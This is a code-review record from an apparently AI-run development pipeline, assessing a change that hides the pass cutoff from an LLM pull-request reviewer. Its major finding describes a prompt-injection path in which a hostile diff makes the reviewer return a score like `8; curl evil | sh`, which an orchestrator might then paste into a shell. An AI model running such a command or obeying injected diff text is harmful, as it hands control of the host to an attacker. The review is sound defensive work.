---
stage: review
run: feature:reviewer-blind-cutoff
date: 2026-11-04
assumptions:
  - "Interview answers came from autorun-brief.md; review asks none. The diff is `eff46d2..HEAD` (the run's base is origin/main at eff46d2), code and skill text only; the run's own artifacts were read, not reviewed."
  - "The battery ran with `python3 run_tests.py -j 3` because five parallel runs share the machine; -j only sets worker count."
  - "Severity of the shell-injection finding is ranked major, not critical: the reviewer's text reaches a shell only if the orchestrator pastes it unquoted, the effect is bounded by the orchestrator's own permissions, and the previous design had no such step. The Owner may re-rank."
---

# Review: Withhold the pass cutoff from the implement-queue reviewer

## Scope

`git diff eff46d2..HEAD` on `feat/reviewer-blind-cutoff`, excluding the
run's own stage artifacts: `reviewer_verdict.py` (new), `factory.py`
(one VERBS row), `skills/implement-queue/SKILL.md` and
`references/reviewer-contract.md`, `.claude/implement-queue.md`,
`docs/factory/merge-train-routine.md`,
`docs/factory/hourly-improvement-routine.md`, ADR-0123 and its index
row, `docs/backlog.md`, `tests/test_reviewer_verdict.py`,
`tests/test_reviewer_data_rule.py`, `tests/README.md`. Consumers of the
reviewer's `verdict` field were grepped across `skills/implement-queue`,
`docs/factory` and the profile; no Python reads the field.

## Findings

### Major: security — the reviewer's score is interpolated into a shell command with no guard

- Scenario: the `verdict` hook is `python3 reviewer_verdict.py <score>`
  and the score is text the reviewer model returns after reading an
  untrusted diff. A diff that talks the reviewer into returning
  `score: "8; curl evil | sh"` (or `$(...)`) leaves the orchestrator,
  an LLM filling `<score>` into a shell line, to paste it. Nothing in
  `SKILL.md` step 5 or the profile said to quote it or to check it is a
  number first; the old design only parsed the field and never ran it.
  `reviewer_verdict.py` itself is safe (argv, no shell), so the gap is
  the instruction at the boundary.
- Standard: none (`docs/standards.json` has no matching statement for
  this boundary).
- Decision: fixed — `skills/implement-queue/SKILL.md` step 5 and
  `.claude/implement-queue.md`'s `## verdict` now say to pass the score
  as one quoted argument and only once it reads as a bare number. A
  non-number is already an `error` by the existing rule.

### Minor: correctness — an int too large for a float raises instead of returning `error`

- Scenario: `reviewer_verdict.derive(10 ** 400)` raised
  `OverflowError: int too large to convert to float`; as a CLI the
  traceback exits 1, which the hook reads as `flag`. The command line
  cannot reach it (`float("1" + "0" * 400)` is `inf`, already an
  `error`), so only a Python caller can. It fails safe (no merge) but
  breaks the module's stated "no usable score → error, exit 2".
- Standard: none
- Decision: fixed — `OverflowError` joins the caught exceptions in
  `derive`, and `tests/test_reviewer_verdict.py` adds `10 ** 400` to
  the unusable-score cases.

### Minor: design — the reviewer can still read the threshold from the worktree

- Scenario: the reviewer runs in the worker's worktree (contract Input
  note, Constraints), where `reviewer_verdict.py` holds `PASS_AT = 7`,
  and the profile's `verdict` section is a repo file. A reviewer that
  opens either learns the line. The contract and the dispatch input name
  no threshold, which is the claim made.
- Standard: none
- Decision: deferred — architecture.md accepts this residue (the rubric
  bands and the repo files stay readable); closing it needs the
  threshold outside the checkout, which moves the owner out of the repo
  and is a new ADR. Posting the score, the part the Owner asked for,
  makes any anchoring measurable.

### Minor: complexity — a consumer repo with `merge: auto` and no `verdict` hook stops merging

- Scenario: the skill is vended to other repos; `reviewer_verdict.py`
  is a root tool not shipped with it, so such a repo has no hook and every
  reviewed PR is an `error`. Fails closed by design.
- Standard: none
- Decision: deferred — ADR-0123 Consequences name it and this repo's
  profile ships the hook in the same change; no other consumer is
  visible from here.

## Passes with no findings

- **Correctness**: otherwise clean. `derive` returns `flag` for 6.5,
  `pass` for 7 to 10, `error` for None, bool, "", NaN, inf, negatives
  and above 10 (`tests/test_reviewer_verdict.py`); `main` maps pass, flag,
  error to exit 0, 1, 2 and a wrong argument count to usage with exit 2.
  Ran by hand: `8` → `reviewer-verdict: pass (score 8/10)` exit 0;
  `6.5` → `flag (score 6.5/10)` exit 1; `""` → `error (score is not a
  number (''))` exit 2.
- **Design**: matches `architecture.md` (one owner in
  `reviewer_verdict.py`; the contract states no number; `factory.py`
  VERBS row follows the existing `argv` pattern). The rubric-bands
  question the brief left open has a recorded decision (kept; residue
  stated). The ADR owed for moving the verdict decision exists
  (ADR-0123, provisional) and no existing ADR's Decision text was edited.
- **Complexity**: `reviewer_verdict.py` is 59 lines with one constant,
  one pure function and a `main`; nothing on the lean cut-list stands
  out, and the diff adds no `lean:` marker.
- **ADR compliance** (`adr_status.py` listing, 123 ADRs): read ADR-0087
  and ADR-0096 (auto-merge on the reviewer's pass: still gated by the
  derived pass), ADR-0060 (root-only tool, no `skills/` import) and
  ADR-0123 itself. No violation. Others are out of scope: they govern
  the factory dispatch, tracker, eval and kb planes the diff never
  reaches.
- **Domain passes**: none selected (no payment, migration or dependency
  path changed).
- **Standards**: `docs/standards.json` statements for `factory` and
  `pipeline` read; none matched a finding.

## Verdict

Ready to ship. No critical finding existed and none remains; the one
major is fixed and the two minors are deferred with reasons above. The
battery after the fixes, run from the worktree:

    python3 run_tests.py -j 3   → tests: 3999 tests across 127 modules in 49.0s on 3 workers, 0 problem(s)
    python3 lint.py             → lint: 0 problem(s) across 35 skills
    python3 kb.py drift         → drift: 0 problem(s)
    python3 gates.py            → gates: 0 problem(s)
    python3 gates.py --selftest → selftest: ok
    python3 factory_init.py update-manifest → factory-init: 0 problem(s)

Not run and not claimed: whether the reviewer anchors to the line
(unmeasured by design), and a live implement-queue run with the new
hook; no paid run was made and none is owed (no `description` changed).
